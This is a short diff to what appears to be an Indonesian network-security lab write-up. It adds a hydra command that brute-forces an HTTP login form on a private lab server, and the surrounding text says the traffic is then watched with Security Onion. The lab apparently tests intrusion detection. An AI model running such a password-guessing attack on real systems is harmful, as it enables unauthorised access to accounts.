@@ -16,6 +16,7 @@ Pengujian dilakukan menggunakan perintah berikut untuk memastikan koneksi antara
 
 ```bash
 sudo hping3 -1 192.168.10.10
+hydra -l admin -P /usr/share/pass.txt 192.168.10.10 http-form-post "/login.php:user=^USER^&pass=^PASS^:F=NIP/NIS atau kata sandi salah untuk akun \"admin\"."
 ```
 Lalu pada SecOnion untuk mendeteksi lalulintas jaringan menuju Server.
 
